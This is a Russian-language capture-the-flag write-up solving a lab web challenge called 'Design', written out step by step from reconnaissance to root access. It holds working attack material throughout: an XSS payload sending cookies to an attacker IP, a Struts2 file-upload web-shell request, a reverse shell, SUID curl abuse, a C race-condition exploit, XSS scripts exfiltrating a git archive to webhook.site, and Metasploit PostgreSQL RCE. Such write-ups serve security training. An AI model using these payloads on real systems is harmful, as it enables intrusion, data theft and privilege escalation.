OneTask – April
Название: Design
Сложность: MediumWriteup by Mr.ZapiКатегория: WEB  
Текст задания
DesignCybered – дизайнерская компания с командой профессионалов, которая поможет воплотить ваши идеи в реальность, создавая визуальные концепции, которые впечатляют. В данный момент доступен только лендинг компании, но компания развивает функционал сайта. Пользователи могут изучить информацию о компании и в будущем подать заявку на дизайн своего бизнеса.
Решение
1. Подключение к таске
Запускаем таску и подключаемся через OpenVPN:
sudo openvpn cybered-labs-3196.ovpn

Проверяем подключение и запускаем Nmap-сканирование:
nmap -A -Pn 10.10.0.28 -v

Результаты показывают веб-сайт, два SSH-порта и PostgreSQL 9.6.0.
2. Сканирование субдоменов
Добавляем домен в /etc/hosts:
sudo nano /etc/hosts

Сканируем субдомены с помощью ffuf:
ffuf -w /usr/share/wordlists/subdomains-top1million-110000.txt -u "http://design.cybered" -H "Host:FUZZ.design.cybered" -fs 273

-fs 273 фильтрует ответы с длиной 273 байта. Находим субдомен beta.design.cybered.
Проверяем свой IP в VPN-туннеле:
ip a

3. Обнаружение XSS-уязвимости
На сайте http://beta.design.cybered есть форма для отправки данных, уязвимая к XSS-атаке. Используем следующую нагрузку для кражи сессионных куки:
<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">

После отправки данных в адресной строке появляется запрос на /beta/order.action.
4. Сканирование директорий и уязвимостей
Сканируем директории и находим login.action. Запускаем nuclei для поиска уязвимостей:
nuclei -u http://beta.design.cybered/beta/login.action

Поднимаем локальный Python-сервер для получения куки:
python3 -m http.server 8888

5. Доступ к админ-панели
Подставляем украденные куки через F12 и получаем доступ к админ-панели. В исходном коде страницы находим путь к первой части флага:
Фрагмент флага: _@ll0weD_but
Nuclei обнаруживает уязвимость в режиме разработки Java-сервера. После анализа находим путь загрузки файлов.
6. Эксплуатация Struts2 (CVE-2024-53677)
Используем эксплойт для Struts2:
https://github.com/EQSTLab/CVE-2024-53677
В эксплойте указан путь загрузки файла:
def exploit(self) -> None:
    files = {
        'Upload': ("exploit_file.jsp", self.file_content, 'text/plain'),
        'top.UploadFileName': (None, self.path),
    }

Загружаем веб-шелл:
https://github.com/LaiKash/JSP-Reverse-and-Web-Shell/blob/main/shell.jsp
Формируем запрос через Burp Suite:
POST /beta/api/changeProfile.action HTTP/1.1
Host: beta.design.cybered
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfrG1NKAulXmTfFwj
Content-Length: 1218

------WebKitFormBoundaryfrG1NKAulXmTfFwj
Content-Disposition: form-data; name="profile.firstName"
john
------WebKitFormBoundaryfrG1NKAulXmTfFwj
Content-Disposition: form-data; name="profile.lastName"
john
------WebKitFormBoundaryfrG1NKAulXmTfFwj
Content-Disposition: form-data; name="profile.email"
123
------WebKitFormBoundaryfrG1NKAulXmTfFwj
Content-Disposition: form-data; name="profile.age"
123
------WebKitFormBoundaryfrG1NKAulXmTfFwj
Content-Disposition: form-data; name="profile.avatar"; filename="hop.jsp"
Content-Type: application/octet-stream

[WEB SHELL CONTENT FROM shell.jsp]
------WebKitFormBoundaryfrG1NKAulXmTfFwj
Content-Disposition: form-data; name="top.profile.avatarFileName"
../../../../../../../tmp/jetty-0_0_0_0-8080-beta_war-_beta-any-13699632876443524533/webapp/ROOT/shell.jsp
------WebKitFormBoundaryfrG1NKAulXmTfFwj--

Запускаем слушатель:
nc -lvnp 1337

Переходим по /ROOT/hop.jsp и получаем reverse shell.
7. Повышение привилегий
Прокидываем SSH-ключи и находим бинарь с SUID-битом в /opt. Также обнаруживаем архив git_archive.tar.gz:
scp -P 2222 web-user@10.10.0.40:/opt/jetty/webapps/uploads/git_archive.tar.gz .

Разархивируем и восстанавливаем Git:
git restore .

Находим вторую часть флага и файл DatabaseHelper.java с учетными данными PostgreSQL.
8. Доступ к базе данных
Подключаемся к PostgreSQL (порт 5432) через DBeaver, используя найденные учетные данные. Находим учетные данные второго пользователя.
Переключаемся на второго пользователя через su и возвращаемся в /opt. Находим бинарь curl с SUID-битом. Используем GTFObins для повышения привилегий:
https://gtfobins.github.io/gtfobins/curl/
URL=http://100.100.133.44:8000/authorized_keys
LFILE=/home/remus/.ssh/authorized_keys
./curl $URL -o $LFILE

Подключаемся по SSH к пользователю remus.
9. Финальное повышение привилегий
В домашней директории remus находим нестандартный бинарь с SUID-битом. Он позволяет читать файлы с условиями:

Пользователь — remus.
Файл не является симлинком.
Имя файла не содержит flag, id_rsa или shadow.

Используем уязвимость race condition. Создаем C-программу для быстрой замены файлов:
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>

#define BINARY_PATH "/home/remus/readfile"
#define SAFE_FILE "./file"
#define LINK_FILE "./link"

void *swap_files(void *arg) {
    char temp_file[] = "/tmp/temp";
    while (1) {
        if (rename(SAFE_FILE, temp_file) == -1) perror("Rename safe to temp failed");
        if (rename(LINK_FILE, SAFE_FILE) == -1) perror("Rename link to safe failed");
        if (rename(temp_file, LINK_FILE) == -1) perror("Rename temp to link failed");
    }
    return NULL;
}

void *run_binary(void *arg) {
    while (1) {
        int pipefd[2];
        if (pipe(pipefd) == -1) { perror("Pipe failed"); exit(1); }
        pid_t pid = fork();
        if (pid == -1) { perror("Fork failed"); exit(1); }
        else if (pid == 0) {
            close(pipefd[0]);
            dup2(pipefd[1], STDOUT_FILENO);
            dup2(pipefd[1], STDERR_FILENO);
            close(pipefd[1]);
            char *args[] = {BINARY_PATH, SAFE_FILE, NULL};
            execv(BINARY_PATH, args);
            perror("Exec failed");
            exit(1);
        }
        close(pipefd[1]);
        char buffer[1024];
        ssize_t nread;
        while ((nread = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
            buffer[nread] = '\0';
            printf("%s", buffer);
            fflush(stdout);
        }
        close(pipefd[0]);
        waitpid(pid, NULL, 0);
    }
    return NULL;
}

int main() {
    pthread_t swap_thread, binary_thread;
    if (pthread_create(&swap_thread, NULL, swap_files, NULL) != 0) {
        perror("Failed to create swap thread");
        exit(1);
    }
    if (pthread_create(&binary_thread, NULL, run_binary, NULL) != 0) {
        perror("Failed to create binary thread");
        exit(1);
    }
    pthread_join(swap_thread, NULL);
    pthread_join(binary_thread, NULL);
    return 0;
}

Создаем файлы:
touch file
ln -s /root/root_flag link
gcc -o race race.c

Запускаем программу и получаем последнюю часть флага.
Итоговый флаг: CyberED{N0_H@ck1Ng_@ll0weD_but_Sn5ak_1n}
10. Альтернативное решение через XSS
Команда @john01bad и @denis_bardak предложила решение через XSS для выгрузки .git без RCE:
<script>
fetch("http://localhost:8080/")
  .then(response => response.text())
  .then(data => fetch("https://webhook.site/2321", {method: "POST", body: data}));
</script>

Или для выгрузки архива:
<script>
fetch('http://localhost:8080/uploads/git_archive.tar.gz')
  .then(response => response.arrayBuffer())
  .then(buffer => {
    let binary = '';
    let bytes = new Uint8Array(buffer);
    let len = bytes.byteLength;
    for (let i = 0; i < len; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    let base64Data = btoa(binary);
    fetch('https://webhook.site/', {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain'
      },
      body: base64Data
    });
  });
</script>

Данные декодируются из Base64 и сохраняются в файл.
11. Альтернативный RCE через PostgreSQL (CVE-2019-9193)
Используем уязвимость PostgreSQL 9.6.0:
https://www.exploit-db.com/exploits/51247
Запускаем Metasploit:
msfconsole
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS 10.10.0.28
set RPORT 5432
set USERNAME [username]
set PASSWORD [password]
set DATABASE [database]
run

Получаем shell, создаем нормальный TTY через Python, прокидываем SSH-ключи и подключаемся по SSH.
Благодарности
Спасибо организаторам CyberED и создателю таски за интересное задание! Разные подходы позволили каждому найти свой путь к решению. Всем удачи!
